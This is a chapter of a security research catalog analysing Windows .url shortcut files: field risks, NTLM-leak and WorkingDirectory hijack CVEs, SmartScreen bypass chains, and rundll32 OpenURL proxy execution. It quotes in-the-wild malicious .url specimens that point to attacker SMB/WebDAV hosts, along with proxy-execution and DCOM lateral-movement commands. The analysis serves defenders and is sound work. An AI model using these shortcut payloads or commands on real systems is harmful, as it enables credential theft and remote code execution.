# 5. Security-Relevant Behaviors

> Part of the [catalog](../README.md). [Chapters](README.md) · [Bibliography](../references.md) · [Specimens](../specimens/README.md)
>
> ← [4. Property bags](04-property-bags.md) · **5. Security behaviors** · [Abuse cases →](06-abuse-cases.md)

## Contents

- [5.1 Field risk matrix](#51-field-risk-matrix)
- [5.2 Render-time resource access: IconFile and the NTLM-leak class](#52-render-time-resource-access-iconfile-and-the-ntlm-leak-class)
- [5.3 Execution-context hijacking: WorkingDirectory (CVE-2025-33053)](#53-execution-context-hijacking-workingdirectory-cve-2025-33053)
- [5.4 Execution chains via URL=: file://, zip-in-path, search-ms:, WebDAV](#54-execution-chains-via-url-file-zip-in-path-search-ms-webdav)
- [5.5 MotW and SmartScreen interactions (CVE-2016-3353, CVE-2023-36025, CVE-2024-21412)](#55-motw-and-smartscreen-interactions-cve-2016-3353-cve-2023-36025-cve-2024-21412)
- [5.6 Proxy execution: the OpenURL exports (LOLBAS)](#56-proxy-execution-the-openurl-exports-lolbas)
- [5.7 Patch archaeology and Windows-version notes](#57-patch-archaeology-and-windows-version-notes)


The fields of a `.url` file are not read at one moment. Windows Explorer parses a subset of the file merely to *render* it (icon, tooltip, property sheet), while a different subset is honored only when the file is *opened* (double-click, `ShellExecute`, or `rundll32 ieframe.dll,OpenURL`). This split produces two disjoint attack classes: a render-time class that leaks NTLM credentials with no user interaction beyond viewing a folder, and an open-time class that drives execution. Security tooling that scans only at open misses the entire first class.[^108]

## 5.1 Field risk matrix

Terminology: **render-time** = parsed when Explorer enumerates/displays the file; **open-time** = honored when the shortcut is launched; **network access** = can cause a connection to a remote host; **execution influence** = changes what or how code runs.

| Field | Render-time? | Open-time? | Network access? | Execution influence? | Confidence |
|---|---|---|---|---|---|
| `URL=` | Yes — resolved for `file://` targets when the folder is browsed[^109] | Yes — passed as `lpFile` to `ShellExecuteEx`[^110] | Yes (`file://` UNC, WebDAV, any scheme)[^111] | Yes — selects the executed target | [RE'd] (Quarkslab pipeline)[^110] |
| `IconFile=` | Yes — resolved to draw the icon on folder view[^109] | Yes (disguise icon)[^112] | Yes — UNC/HTTP icon fetch triggers NTLM auth[^113] | No | [Observed] (in-the-wild xd.url)[^112] |
| `IconIndex=` | Yes (with IconFile) | Yes | No (accompanies IconFile) | No | [Documented] (PID_IS_ICONINDEX)[^114] |
| `WorkingDirectory=` | No | Yes — becomes CWD of the launched process[^111] | Yes — accepts WebDAV UNC paths[^111] | Yes — DLL/EXE search-order hijack (CVE-2025-33053) | [Observed] (Stealth Falcon specimen)[^111] |
| `ShowCommand=` | No | Yes — window state (7 = SW_SHOWMINNOACTIVE)[^111] | No | Cosmetic/stealth | [Documented] (PID_IS_SHOWCMD)[^114] |
| `HotKey=` | No | Yes (activation hotkey) | No | No | [Documented] (PID_IS_HOTKEY)[^114] |
| `IDList=` | Yes — Explorer prefers IDList to locate the resource | Yes | Indirect (can encode shell items) | No | [Observed] (parser surveys)[^115] |
| `Modified=` | No | No (metadata) | No | No | [Observed] (FILETIME+checksum encoding)[^115] |
| `Prop3=19,9` (FMTID_Intshcut) | Parsed with property store | No demonstrated role | No | None proven — semantics unknown | [Observed] (recurs in malicious specimens; semantics unknown)[^110] |
| `[InternetShortcut.W] URL=` (UTF-7) | Yes | Yes — can carry the operative target[^116] | Yes | Yes (smuggling channel) | [Observed] (Blind Eagle specimen)[^116] |

Two rows deserve emphasis. First, `URL=` appears in *both* trigger columns: Check Point's CVE-2024-43451 analysis and the MS Q&A specimen of `URL=file://server/...` hanging every Open File dialog show that Explorer touches the target at enumeration time, before any Open verb fires.[^109][^117] Second, `Prop3=19,9` recurs across the MS16-104 PoC, the CVE-2023-36025 specimen, and the CVE-2024-21412 second-stage shortcut, yet Quarkslab's binary analysis assigns it no exploit role and Microsoft documents FMTID_Intshcut PROPIDs 2, 4–13 and 15 but not PID 3; it is recorded here as an undocumented PROPID (VT_UI4) with observed values 0/2/9/11/15 and unknown semantics, not as a vulnerability trigger.[^110][^114]

## 5.2 Render-time resource access: IconFile and the NTLM-leak class

The oldest documented .url primitive is credential leakage at render time. In March 2017 Osanda Malith Jayathissa published that a two-line shortcut — `[InternetShortcut]` / `URL=file://192.168.0.1/@OsandaMalith` — forces the machine to authenticate to the attacker's SMB server when the file is handled by the shell.[^118] Pentestlab's December 2017 SCF post supplied the canonical `IconFile=\\X.X.X.X\share\pentestlab.ico` recipe and the Responder capture workflow; the string `pentestlab.ico` was later copied verbatim into in-the-wild malicious .url files, which is why the technique is often attributed to pentestlab even though its post covered `.scf`.[^119] The Greenwolf `ntlm_theft` generator documents both leak fields explicitly: ".url – via URL field; .url – via ICONFILE field," each triggered by merely browsing to the containing folder, because the shell resolves the icon and target to render the view.[^120] A 2018 field variant adds environment-variable expansion — `IconFile=\\192.168.49.102\%USERNAME%.ico` — so the victim's username arrives inside the SMB request itself.[^121]

Microsoft treated the 2017-era SCF variant as by-design, issuing only the ADV170014 hardening advisory, which is why the same primitive kept resurfacing as CVEs.[^121] The .url form was finally patched as **CVE-2024-43451** (November 12, 2024) after zero-day exploitation against Ukraine attributed by CERT-UA to UAC-0194.[^112] The in-the-wild specimen `xd.url` (SHA1 `76e93c97ffdb5adb509c966bca22e12c4508dcaa`), recovered from the March 2025 "NTLM Exploits Bomb" campaign against Polish and Romanian institutions, reads:

```
[InternetShortcut]
URL=file://159.196.128[.]120/
IconIndex=4
HotKey=0
IDList=
IconFile=\\159.196.128[.]120\share\pentestlab.ico
```

Attribution requires care: Check Point tags this .url as the **CVE-2024-43451** companion delivered in the same `xd.zip` archive as the `.library-ms` exploit for **CVE-2025-24054** (patched March 11, 2025; the .library-ms triggers on ZIP extraction with no interaction at all).[^112] The .url member "triggers on right-click, delete, or drag-and-drop" — per Microsoft, "minimal user interaction … such as selecting (single-clicking), inspecting (right-clicking), or performing any action other than opening or executing the file."[^112] Where SMB egress (port 445) is blocked, the WebClient service carries the UNC over HTTP — Blind Eagle specified port 80 in the UNC path so "the connection … [is] made directly using the WebDAV protocol over HTTP … This type of connection also leaks NTLM hashes."[^122] Captured NTLMv2-SSP responses are brute-forced offline or relayed for lateral movement.[^112]

## 5.3 Execution-context hijacking: WorkingDirectory (CVE-2025-33053)

The open-time counterpart is the field that controls *where* the launched process runs. In March 2025 a shortcut named `TLM.005_TELESKOPIK_MAST_HASAR_BILDIRIM_RAPORU.pdf.url` was submitted to VirusTotal from a source tied to a major Turkish defense company; Check Point attributes the campaign to Stealth Falcon. Its verbatim contents:[^111]

```
[InternetShortcut]
URL=C:\Program Files\Internet Explorer\iediagcmd.exe
WorkingDirectory=\\summerartcamp[.]net@ssl@443/DavWWWRoot\OSYxaOjr
ShowCommand=7
IconIndex=13
IconFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
Modified=20F06BA06D07BD014D
```

The chain is a study in per-field composition. `URL=` names a *local, signed* binary — `iediagcmd.exe`, the Internet Explorer diagnostics utility — so no remote executable is ever dropped by the shortcut itself. `WorkingDirectory=` points the process's current directory at an attacker WebDAV share (`@ssl@443/DavWWWRoot` = WebDAV over HTTPS on 443). `iediagcmd.exe` internally calls .NET `Process.Start()` with **bare filenames** — `LaunchProcess("route", "print", ...)`, `ipconfig`, `netsh`, `ping` — and the Windows search order checks the current directory first, so the attacker's `\\…\OSYxaOjr\route.exe` (the "Horus Loader") runs instead of `system32\route.exe`.[^111] `ShowCommand=7` minimizes the window; `IconFile`/`IconIndex=13` borrow the Edge icon for disguise. The loader (Code Virtualizer–protected, expired "Danielle D Festa" Sectigo certificate) performs anti-AV checks against 109 process names, drops a decoy PDF from its `.udata` section, and injects an "IPfuscation" payload (thousands of `RtlIpv6StringToAddressA` calls) into a suspended `msedge.exe` via thread-context hijack; the final implant is the Horus Agent, a custom Mythic C2 with C2 at `roundedbullets[.]com`.[^111] Artifacts indicate a secondary LOLBin, `CustomShellHost.exe`, abused the same way to spawn `explorer.exe` from its working folder.[^111]

Microsoft patched CVE-2025-33053 on June 10, 2025 (CVSS 8.8, CWE-73; CISA KEV same day). Per 0patch's analysis, the fix "chang[es] the behavior of URL files such as to ignore the WorkingDirectory value when launching executables" — a field-level neutering, not a bug fix.[^123] Two version caveats, both attributable to **Rapid7** (the Check Point report contains no version list and never mentions 24H2): the technique requires `iediagcmd.exe` to exist, which fails on **Windows 11 24H2 where IE is removed**, and attackers responded by generating **59 alternative .url LOLBin variants** (CustomShellHost.exe, InstallUtil, RegAsm, RegSvcs, dfsvc, csc, vbc, fodhelper, wsreset, and others) to work around 24H2.[^124]

## 5.4 Execution chains via URL=: file://, zip-in-path, search-ms:, WebDAV

The `URL=` value is scheme-agnostic, and four scheme patterns account for nearly all modern abuse:

| Pattern | Example (verbatim from specimens) | Effect | Confidence |
|---|---|---|---|
| `file://` UNC | `URL=file://159.196.128[.]120/` | SMB/WebDAV connection to attacker host | [Observed][^112] |
| Zip-in-path | `URL=file://51.79.185.145/pdf/data3.zip/pdf3.cpl` | Explorer treats ZIP as folder; inner file executes, evading MotW because the payload never lands on an ADS-marked NTFS path[^125] | [RE'd] (Quarkslab, from Project Zero #693)[^110] |
| `search-ms:` AQS | `URL=search-ms:crumb=location:C%3a%5c…%5c&crumb=location:%5C%5Cexample.com%5cDavWWWRoot%5c&displayname=Downloads` | Opens Explorer "search results" rendering a remote WebDAV share under a fake folder name | [Observed][^126] |
| Direct DavWWWRoot | `URL=file://offset-character-purposes-midlands.trycloudflare.com@SSL/DavWWWRoot/tgpzdcv.wsh` | Direct execution of a WebDAV-hosted script via native components | [Observed][^127] |

The zip-in-path row originates with Tavis Ormandy's Project Zero issue #693: `ShellExecute` on `C:/Users/someone/Downloads/test.zip/test.hta` runs the inner .hta; Quarkslab verified the trick also works when the zip sits on a remote SMB share reached via `file:///\\host\share\…`.[^110] The `search-ms:` row is the lure layer Water Hydra industrialized: an HTML anchor `search:query=photo_2023-12-29.jpg&crumb=location:\\84.32.189.74@80\fxbulls\pictures&displayname=Downloads` constrains the search to the malicious WebDAV share while `displayname` masquerades as the local Downloads folder, and Windows' `NeverShowExt` hides the `.url` extension so the target appears to be a JPEG.[^128] Trellix documents the same anatomy with `@SSL\DavWWWRoot` crumbs.[^129] Finally, the `[InternetShortcut.W]` section is a live smuggling channel: Blind Eagle's specimen places the operative URL *after* empty `.A`/`.W` sections, encoding `_` as the UTF-7 sequence `+AF8-` (`Certificate+AF8hFgBf-45052389+AF8-005553.exe`), which almost no security tooling decodes.[^116]

## 5.5 MotW and SmartScreen interactions (CVE-2016-3353, CVE-2023-36025, CVE-2024-21412)

**Mark-of-the-Web (MotW)** is the `Zone.Identifier` NTFS alternate data stream Windows attaches to downloaded files; **SmartScreen** is the reputation check Explorer consults before executing MotW-tagged content. Three CVEs show the .url format defeating each layer in turn.

**CVE-2016-3353 (MS16-104).** Quarkslab's patch-diff of `ieframe.dll` 11.0.9600.18427 → 11.0.9600.18450 localizes the .url open path: `rundll32.exe ieframe.dll,OpenURL %l` constructs a `CInternetShortcut`, `LoadFromFileW` parses the file, and `CInternetShortcut::_InvokeCommand` drives a `CExecHelper` through four stages — `Init` (builds a `SHELLEXECUTEINFO` with **`lpParameters = NULL`**, so no attacker-supplied command-line arguments are possible), `ResolveProtocol` (checks the `URL=` scheme is registered), `IEDirectExec` (tries opening in IE), and `Execute` (falls back to `ShellExecuteEx`).[^110] Pre-patch, the MotW ADS was never consulted, so a downloaded .url executed its target — e.g. an .hta inside a zip on an SMB share — with zero warnings. The patch gates `_InvokeCommand` behind `CDownloadUtilities::OpenSafeOpenDialog` when the file has the .URL extension *and* carries MotW.[^110] ZDI-16-506 credits Eduardo Braun Prado; the PoC carried `Prop3=19,9`, the first appearance of that recurring marker.[^130]

**CVE-2023-36025.** The November 2023 zero-day moved the bypass from ieframe to `windows.storage.dll`. M01N Team's reverse engineering shows `CInvokeCreateProcessVerb::ProcessCommandTemplate` has two branches: the non-parameterized branch calls `CheckSmartScreenWithAltFile` (COM call to smartscreen.exe), but the branch taken when the extracted payload is launched *with parameters* — via wscript or control.exe — skipped that check entirely; the patch adds `CheckSmartScreenWithAltFile` to the second branch.[^131] The in-the-wild `DocuSign3.url` (Phemedrone Stealer campaign) verbatim:[^132]

```
[{000214A0-0000-0000-C000-000000000046}]
Prop3=19,9
[InternetShortcut]
IDList=
URL=file://51.79.185.145/pdf/data3.zip/pdf3.cpl
IconIndex=12
HotKey=0
IconFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
```

**CVE-2024-21412.** Trend Micro ZDI discovered that chaining defeats the 36025 patch: a first .url pointing at a *second* .url causes SmartScreen to "fail to properly apply Mark-of-the-Web" to the final target.[^128] Water Hydra's two stages, verbatim:[^128]

```
[InternetShortcut]                      [InternetShortcut]
URL=file://84.32.189.74@80/fxbulls/images/2.url      URL=file://84.32.189.74@80/fxbulls/images/a2.zip/a2.cmd
IconFile=C:\Windows\System32\imageres.dll            IDList=
IconIndex=126                                        HotKey=0
 (photo_2023-12-29.jpg.url)                          [{000214A0-0000-0000-C000-000000000046}]
                                                     Prop3=19,9
                                                     (2.url)
```

The DarkGate operators independently exploited the same bug with `JANUARY-25-2024-FLD765.url` → `gamma.url` → `instantfeat.zip/instantfeat.msi` (both stages using `ShowCommand=7` and shell32.dll icons).[^133] Patched February 13, 2024 (CVSS 8.1, CWE-693; CISA KEV same day), the fix was itself re-bypassed two months later by **CVE-2024-29988**.[^134] Note that `Prop3=19,9` appears in all three generations of specimens while remaining semantically undocumented ([§5.1](#51-field-risk-matrix)).

## 5.6 Proxy execution: the OpenURL exports (LOLBAS)

Three System32 DLLs export an `OpenURL` entry point invocable through `rundll32`, giving signed-binary proxy execution (MITRE T1218.011):[^135]

| Command | Notes | Confidence |
|---|---|---|
| `rundll32.exe ieframe.dll,OpenURL <path>.url` | The live shell open command since Vista; LOLBAS-listed Win10/11 | [Documented] (LOLBAS)[^135] |
| `rundll32.exe url.dll,OpenURL <path>.url` | Internet Shortcut Shell Extension DLL; also `OpenURLA` | [Documented] (LOLBAS)[^136] |
| `rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/…` | Caret-obfuscated command line; also runs `.hta` via mshta | [Documented] (LOLBAS)[^136] |
| `rundll32.exe shdocvw.dll,OpenURL <path>.url` | XP-era shell open command; variant contributed by bohops | [Documented] (LOLBAS)[^137] |

All three tolerate a **renamed extension** — "the .url file extension can be renamed" — and sailay1996's ADS notes show the .url content can additionally be hidden in an NTFS alternate data stream (`rundll32.exe ieframe.dll,OpenURL C:\temp\ads\fake.txt:test.txt`).[^135][^138] The exports call `ShellExecute` with a NULL verb, resolving the registry default handler.[^139] Bohops extended the primitive to lateral movement: the DCOM `ShellBrowserWindow` object (CLSID `C08AFD90-F2A1-11D1-8455-00A0C91F3880`) exposes `IWebBrowser2.Navigate`/`Navigate2`, which accept UNC paths and run "without the Internet Explorer security constraints" — `(activator … GetTypeFromCLSID("C08AFD90-…","acmedc.acme.int")).Navigate("\\acme01.acme.int\c$\calc.url")` executes a .url on a remote host.[^139] Sigma's "Potentially Suspicious Rundll32 Activity" rule flags all five command-line pairs.[^140]

## 5.7 Patch archaeology and Windows-version notes

The pattern across a decade is that Microsoft *depowers individual fields* rather than documenting the format, so field semantics are version-dependent:[^108]

| CVE (patch date) | Root field(s) | Fix mechanism | Surviving variants / notes | Confidence |
|---|---|---|---|---|
| CVE-2016-3353 (Sep 2016) | `URL=` (MotW ignored) | MotW dialog gate in `CInternetShortcut::_InvokeCommand` (ieframe)[^110] | Technique migrated to zip-in-path and WebDAV carriers | [RE'd][^110] |
| CVE-2023-36025 (Nov 2023) | `URL=` zip-in-path | `CheckSmartScreenWithAltFile` added to parameterized branch in `CInvokeCreateProcessVerb::ProcessCommandTemplate`[^131] | Bypassed by .url→.url chaining (21412) | [RE'd] (M01N)[^131] |
| CVE-2024-21412 (Feb 2024) | `URL=` → second .url | Chained-resolution path applies MotW/SmartScreen (exact mechanics unpublished by MS) | Re-bypassed by CVE-2024-29988 (Apr 2024)[^134] | [Observed][^128] |
| CVE-2024-43451 (Nov 2024) | `IconFile=`/`URL=file://` | NTLM hash disclosure on render-time interactions patched | `.library-ms` sibling CVE-2025-24054 (Mar 2025)[^112] | [Observed][^112] |
| CVE-2025-33053 (Jun 2025) | `WorkingDirectory=` | WorkingDirectory ignored when launching executables[^123] | 59 alternative LOLBin .url variants catalogued by attackers[^124] | [RE'd] (0patch)[^123] |

Two cross-cutting notes. First, WebDAV is the common carrier: every 2023–2025 chain substitutes `@SSL@443/DavWWWRoot` or `@80` WebDAV for SMB because SMB egress is blocked, and each patch closed one branch while the carrier stayed open.[^108] Second, Windows 11 24H2 status: the IE desktop app is disabled but, per Microsoft's retirement FAQ, "the IE11 engine is required for IE mode," so ieframe.dll, url.dll, and shdocvw.dll remain installed and serviced; the OpenURL exports and the `HKCR\InternetShortcut\shell\Open\Command = rundll32.exe ieframe.dll,OpenURL %l` association therefore almost certainly persist on 24H2 — this is an **inference (Med-High confidence)** from the IE-mode servicing commitment and LOLBAS's continued "Windows 10, Windows 11" listing, not a verified export dump.[^141] What *is* confirmed removed on 24H2 is `iediagcmd.exe`, breaking the original CVE-2025-33053 variant (Rapid7).[^124]

---

## Footnotes

[^108]: Research-synthesis insight derived from the Quarkslab, Check Point, Trend Micro, and LOLBAS sources cited below (render-time vs open-time surface split; WebDAV carrier; field-depowering patch pattern).
[^109]: https://learn.microsoft.com/en-us/answers/questions/2150484/extremely-slow-open-file-dialog-from-all-applicati — MS Q&A: .url files with URL=file://server/... hang every Open File dialog at enumeration time.
[^110]: https://blog.quarkslab.com/analysis-of-ms16-104-url-files-security-feature-bypass-cve-2016-3353.html — Quarkslab, "Analysis of MS16-104: .URL files Security Feature Bypass (CVE-2016-3353)" (RE of ieframe OpenURL/CInternetShortcut/CExecHelper; lpParameters=NULL; zip-in-path PoC; Prop3=19,9).
[^111]: https://research.checkpoint.com/2025/stealth-falcon-zero-day/ — Check Point Research, "Stealth Falcon Zero-Day" (CVE-2025-33053; verbatim .url; iediagcmd bare-name search-order hijack; Horus chain; CustomShellHost.exe).
[^112]: https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/ — Check Point Research, "CVE-2025-24054 NTLM Exploit in the Wild" (xd.url verbatim; CVE-2024-43451 companion attribution; trigger interactions; .library-ms campaign).
[^113]: https://github.com/Greenwolf/ntlm_theft — Greenwolf ntlm_theft: .url leaks via URL and ICONFILE fields on folder browse.
[^114]: https://learn.microsoft.com/en-us/windows/win32/lwef/internet-shortcuts — Microsoft Learn, "Internet Shortcuts" (FMTID_Intshcut PID_IS_* property IDs).
[^115]: https://www.cyanwerks.com/formats/file-format-url.html — Edward L. Blake, "An Unofficial Guide to the URL File Format" (Modified FILETIME encoding; field catalog); https://www.cnblogs.com/suv789/p/18324691 — field-status survey (IDList preferred by Explorer).
[^116]: https://research.checkpoint.com/2025/blind-eagle-and-justice-for-all/ — Check Point Research, "Blind Eagle and Justice for All" (in-the-wild .A/.W section trick; UTF-7 +AF8- URL).
[^117]: https://gist.github.com/milo2012/00856e9273ab08829dc715a845abb4ed — CVE-2024-43451 PoC .url gist (empty .A/.W sections, malformed GUID section, bidi Unicode).
[^118]: https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/ — Osanda Malith Jayathissa, "Places of Interest in Stealing NetNTLM Hashes" (2017 .url URL=file:// primitive).
[^119]: https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/ — Penetration Testing Lab, "SMB Share – SCF File Attacks" (IconFile=\\host\share\pentestlab.ico recipe; Responder capture).
[^120]: https://www.rootshellsecurity.net/ntlm-hash-disclosure/ — documentation of ntlm_theft filetype/field coverage.
[^121]: https://www.openwall.com/lists/oss-security/2017/10/24/1 — Juan Diego, ADV170014 SCF hash-theft disclosure (Microsoft guidance-only response); insert-script.blogspot.com 2018 "Leaking Environment Variables" (%USERNAME% in IconFile).
[^122]: https://securelist.com/ntlm-abuse-in-2025/118132/ — Kaspersky Securelist, "NTLM abuse in 2025" (Blind Eagle port-80 WebDAV fallback leaking NTLM hashes).
[^123]: https://blog.0patch.com/2025/06/micropatches-released-for-webdav-remote.html — 0patch, "Micropatches Released for WebDAV Remote Code Execution (CVE-2025-33053)" (verbatim patch-mechanism quote).
[^124]: https://www.rapid7.com/blog/post/tr-exposed-webdav-malware-delivery-lab-analysis/ — Rapid7, analysis of exposed attacker WebDAV test server (Win11 24H2 iediagcmd removal; 59 alternative .url LOLBin variants; attacker patch-check notes).
[^125]: https://bugs.chromium.org/p/project-zero/issues/detail?id=693 — Google Project Zero #693 (Tavis Ormandy; zip-as-folder .hta MotW-evasion trick).
[^126]: https://tradecraft.cafe/Windows-Search-And-WebDAV-Payloads/ — "Windows Search And WebDAV Payloads" (verbatim search-ms .url specimen).
[^127]: https://labs.itresit.es/2026/03/25/when-bills-come-with-surprise-donut-of-python-and-rat/ — itresit labs (verbatim DavWWWRoot .wsh .url); Proofpoint Aug-2024 chain summarized at research.kr-labs.com.ua.
[^128]: https://www.trendmicro.com/en_us/research/24/b/cve202421412-water-hydra-targets-traders-with-windows-defender-s.html — Trend Micro ZDI, "CVE-2024-21412: Water Hydra Targets Traders" (verbatim .url chain; search: AQS lure; SmartScreen/MotW failure).
[^129]: https://www.trellix.com/blogs/research/beyond-file-search-a-novel-method/ — Trellix, "Beyond File Search: A Novel Method" (search-ms URI anatomy).
[^130]: https://www.zerodayinitiative.com/advisories/ZDI-16-506/ — ZDI-16-506 advisory (credit Eduardo Braun Prado; disclosure timeline).
[^131]: https://cn-sec.com/archives/2321455.html — mirror of M01N Team analysis of CVE-2023-36025 (CInvokeCreateProcessVerb::ProcessCommandTemplate; missing CheckSmartScreenWithAltFile branch).
[^132]: https://www.trendmicro.com/en_us/research/24/a/cve-2023-36025-exploited-for-defense-evasion-in-phemedrone-steal.html — Trend Micro, "CVE-2023-36025 Exploited for Defense Evasion in Phemedrone Stealer Campaign" (DocuSign3.url verbatim).
[^133]: https://www.trendmicro.com/en_us/research/24/c/cve-2024-21412--darkgate-operators-exploit-microsoft-windows-sma.html — Trend Micro, "DarkGate Operators Exploit Microsoft Windows SmartScreen Bypass" (verbatim DarkGate .url pair).
[^134]: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21412 — Microsoft Security Update Guide, CVE-2024-21412 (CVSS 8.1, CWE-693, Feb 13 2024); CVE-2024-29988 follow-on per Trend Micro "Facts and Fixes" (https://www.trendmicro.com/en_us/research/24/b/cve-2024-21412-facts-and-fixes.html).
[^135]: https://lolbas-project.github.io/lolbas/Libraries/Ieframe/ — LOLBAS, Ieframe.dll (OpenURL; renamed-extension tolerance).
[^136]: https://lolbas-project.github.io/lolbas/Libraries/Url/ — LOLBAS, Url.dll (OpenURL, FileProtocolHandler with caret obfuscation, TelnetProtocolHandler).
[^137]: https://lolbas-project.github.io/lolbas/Libraries/Shdocvw/ — LOLBAS, Shdocvw.dll (OpenURL).
[^138]: https://github.com/sailay1996/misc-bin/blob/master/ads.md — sailay1996 ADS notes (OpenURL on .url content in NTFS alternate data streams).
[^139]: https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/ — bohops, "Abusing Exported Functions and Exposed DCOM Interfaces" (three OpenURL exports; NULL-verb ShellExecute; ShellBrowserWindow DCOM lateral movement).
[^140]: https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_rundll32_susp_activity/ — Sigma, "Potentially Suspicious Rundll32 Activity" (url.dll/ieframe.dll/shdocvw.dll OpenURL command lines).
[^141]: https://techcommunity.microsoft.com/blog/windows-itpro-blog/internet-explorer-11-desktop-app-retirement-faq/2366549 — Microsoft, "Internet Explorer 11 desktop app retirement FAQ" (IE binaries retained and serviced for IE mode); https://www.hexacorn.com/blog/2018/03/15/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-5/ — hexacorn Part 5 (ieframe/shdocvw OpenURL proxy execution).

<!-- chapter-nav -->

---

← [4. Property bags](04-property-bags.md) · [Chapters](README.md) · [Abuse cases →](06-abuse-cases.md)
